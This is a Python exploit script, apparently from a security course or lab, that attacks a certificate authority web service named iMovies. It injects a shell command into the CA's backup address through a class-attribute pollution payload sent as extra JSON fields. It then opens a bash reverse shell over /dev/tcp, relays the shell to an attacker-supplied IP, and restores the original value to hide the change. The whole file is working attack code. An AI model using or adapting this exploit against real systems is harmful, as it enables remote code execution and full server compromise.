#!/usr/bin/env python3

import os
import random
import socket
import sys
import threading
import time

import requests
from urllib3.exceptions import InsecureRequestWarning

CA_HOST = os.getenv('CA_HOST')

DEFAULT_PASSPHRASE = '_' * 14
BUFFER_SIZE = 4096
TIMEOUT = 60

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def ca_issue(session, uid, email='', firstname='', lastname='', passphrase=DEFAULT_PASSPHRASE, extra_data = {}):
    url = f'{CA_HOST}/issue_certificate'
    json = {
        'cert_data': None,
        'uid': uid,
        'lastname': lastname,
        'firstname': firstname,
        'email': email,
        'passphrase': passphrase,
        'revoke': False,
        **extra_data,
    }
    response = session.post(url, json=json, verify=False)
    response.raise_for_status()

    return response.text


def ca_run_command(session, uid, command):
    original_backup_address = 'bak.imovies.ch'
    ca_issue(session, uid, extra_data={'__class__.__init__.__globals__.CA.BACKUP_ADDRESS': f'{original_backup_address}; {command} &'})
    ca_issue(session, uid, extra_data={'__class__.__init__.__globals__.CA.BACKUP_ADDRESS': original_backup_address})  # Clean up


def ca_reverse_shell(remote_attacker_ip, remote_attacker_port):
    uid = 'ps'
    session = requests.session()
    session.verify = False
    ca_run_command(session, uid, f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{remote_attacker_ip}/{remote_attacker_port} 0>&1'")


def forward_data(source_socket, target_socket):
    try:
        while True:
            data = source_socket.recv(BUFFER_SIZE)
            if not data:
                break
            target_socket.send(data)
    except:
        pass
    finally:
        source_socket.close()
        target_socket.close()


def ca_forward(local_web_ip, local_web_port, remote_attacker_ip, remote_attacker_port):
    ca_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ca_listener.bind((local_web_ip, local_web_port))
    ca_listener.listen(1)

    ca_reverse_shell(local_web_ip, local_web_port)

    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.connect((remote_attacker_ip, remote_attacker_port))

    ca_socket, _ = ca_listener.accept()

    ca_to_attacker = threading.Thread(target=forward_data, args=(ca_socket, attacker_socket), daemon=True)
    attacker_to_ca = threading.Thread(target=forward_data, args=(attacker_socket, ca_socket), daemon=True)

    ca_to_attacker.start()
    attacker_to_ca.start()

    time.sleep(TIMEOUT)

    ca_listener.close()


def main():
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT', file=sys.stderr)
        sys.exit(2)

    local_web_ip = get_ip()
    local_web_port = random.randint(1024, 49151)
    remote_attacker_ip = sys.argv[1]
    remote_attacker_port = int(sys.argv[2])

    ca_forward(local_web_ip, local_web_port, remote_attacker_ip, remote_attacker_port)


if __name__ == '__main__':
    main()
